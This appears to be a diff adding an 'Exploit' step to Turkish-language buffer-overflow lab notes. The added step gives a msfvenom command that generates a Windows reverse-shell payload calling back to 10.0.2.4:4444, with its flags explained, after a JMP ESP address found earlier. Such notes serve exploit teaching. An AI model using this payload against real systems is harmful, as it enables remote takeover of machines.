@@ -64,6 +64,20 @@ Bu modül üzerinde yazma koruması yok. Bu modül üzerinde exploit çalıştı
 ```
 "JMP ESP" işlemi çalıştırılan memory adress'leri not alıp tek tek deniyoruz. Bizim senaryomuzda çalışan memory adress: 0x625011AF
 
+7. Exploit:
+
+Exploit için öncelilkle bir reverse shell koduna ihtiyacımız var.
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+```
+"-p": Payload Türü
+"LHOST": Geri Dönüş Sağlanacak Sunucu
+"LPORT": Geri Dönüş Sağlanacak Sunucunun Portu
+"EXITFUNC": Thread Process
+"-f": C dilinde derlenmesi
+"-a": Architecture
+"-b": Bad Characters
+
 # GDB
 ```
 ● disassemble main - look at the assembly code of the main function
